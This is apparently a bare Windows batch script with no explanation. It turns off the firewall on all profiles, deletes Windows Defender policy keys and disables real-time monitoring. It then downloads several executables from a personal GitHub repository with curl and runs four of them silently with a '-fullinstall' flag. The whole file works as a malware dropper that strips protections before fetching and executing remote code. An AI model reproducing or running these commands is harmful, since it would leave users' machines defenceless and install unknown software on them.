
powershell -Command "Start-Process cmd -ArgumentList '/c netsh advfirewall set allprofiles state off' -Verb runAs"

REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /f

powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

cd c:/windows/system32

del /f /q C:\HANUMAN64.exe
del /f /q C:\linkremotegff.exe
del /f /q C:\remotezone.exe


curl.exe -L -o C:\HANUMAN64.exe https://raw.githubusercontent.com/hari98486/fff/main/HANUMAN64.exe

curl.exe -L -o C:\bhavani.exe https://raw.githubusercontent.com/hari98486/fff/main/bhavani.exe

curl.exe -L -o C:\remotezone.exe https://raw.githubusercontent.com/hari98486/fff/main/remotezone.exe

curl.exe -L -o C:\jai.exe "https://raw.githubusercontent.com/hari98486/jairsreeram/main/jai.exe"

curl.exe -L -o C:\DW.exe "https://raw.githubusercontent.com/hari98486/jairsreeram/main/DW.exe"

curl -L "https://raw.githubusercontent.com/hari98486/systemcheck/main/hara%20(1).exe" -o "C:\hara.exe"

cd c:/

cd c:/windows/system32

C:/bhavani.exe -fullinstall

C:/remotezone.exe -fullinstall 

C:\HANUMAN64.exe -fullinstall

C:\jai.exe -fullinstall 

cd /c 

cd /c 
